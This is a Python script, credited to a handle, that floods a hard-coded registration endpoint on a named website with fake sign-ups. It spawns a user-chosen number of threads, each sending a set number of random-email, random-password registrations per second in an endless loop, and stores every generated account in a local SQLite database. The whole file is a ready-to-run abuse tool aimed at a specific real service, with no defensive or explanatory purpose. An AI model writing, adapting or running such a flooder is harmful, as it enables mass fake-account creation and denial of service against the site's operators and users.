# credits: #nekpr1337

import asyncio
import aiohttp
import random
import string
import sqlite3
import threading
import time
from datetime import datetime

DB_NAME = "accounts.db"
DB_LOCK = threading.Lock()

def init_db():
    with DB_LOCK:
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("""
            CREATE TABLE IF NOT EXISTS accounts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                email TEXT,
                username TEXT,
                password TEXT
            )
        """)
        conn.commit()
        conn.close()

def random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def random_email():
    return f"{random_string(7)}@{random_string(5)}.{random_string(3)}"

def generate_user_data(length=10, pw_length=12):
    return {
        "email": random_email(),
        "username": random_string(length),
        "password": random_string(pw_length)
    }

async def send_registration(session, length=10, pw_length=12):
    url = "https://en1gma.technology/loader/api/web/auth/register.php"
    user_data = generate_user_data(length, pw_length)

    try:
        async with session.post(url, json=user_data) as resp:
            result = await resp.text()
            status = "SUCCESS" if resp.status == 200 else f"FAIL ({resp.status})"
    except Exception as e:
        result = str(e)
        status = "ERROR"

    with DB_LOCK:
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("""
            INSERT INTO accounts (email, username, password)
            VALUES (?, ?, ?)
        """, (user_data["email"], user_data["username"], user_data["password"]))
        conn.commit()
        conn.close()

    print(f"[{status}] {user_data['email']} | {user_data['username']}")

async def worker(length, pw_length, per_second):
    async with aiohttp.ClientSession() as session:
        while True:
            tasks = [send_registration(session, length, pw_length) for _ in range(per_second)]
            await asyncio.gather(*tasks)
            await asyncio.sleep(1)

def thread_entry(length, pw_length, per_second):
    asyncio.run(worker(length, pw_length, per_second))

if __name__ == "__main__":
    init_db()

    threads_count = int(input("Count of threads? "))
    per_second = int(input("Count of registations per second in 1 thread? "))
    length = int(input("length of username/password? "))

    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=thread_entry, args=(length, length, per_second), daemon=True)
        t.start()
        threads.append(t)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nОстановка...")
